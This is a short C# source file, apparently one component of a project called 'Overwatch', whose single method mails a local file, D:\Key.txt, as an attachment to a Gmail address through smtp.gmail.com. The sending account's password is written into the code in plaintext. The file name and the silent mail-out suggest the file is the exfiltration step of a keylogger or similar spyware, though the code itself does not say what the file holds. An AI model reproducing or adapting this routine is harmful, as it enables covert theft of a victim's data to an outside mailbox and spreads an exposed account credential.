using System.Net;
using System.Net.Mail;

namespace Overwatch
{
    class cSendingInformation
    {
        public void Sending() 
        {
            MailAddress from = new MailAddress("isthechastener@gmail.com");
            MailAddress to = new MailAddress("satiriorn@gmail.com");
            MailMessage message = new MailMessage(from, to);
            message.Attachments.Add(new Attachment("D:\\Key.txt"));
            message.Subject = "Information";
            message.Body = "<h2>Письмо-тест работы</h2>";
            message.IsBodyHtml = true;
            SmtpClient smtp = new SmtpClient("smtp.gmail.com", 25);
            smtp.Credentials = new NetworkCredential("isthechastener@gmail.com", "192020castle");
            smtp.EnableSsl = true;
            smtp.Send(message);
            message.Dispose();
        }
    }
}
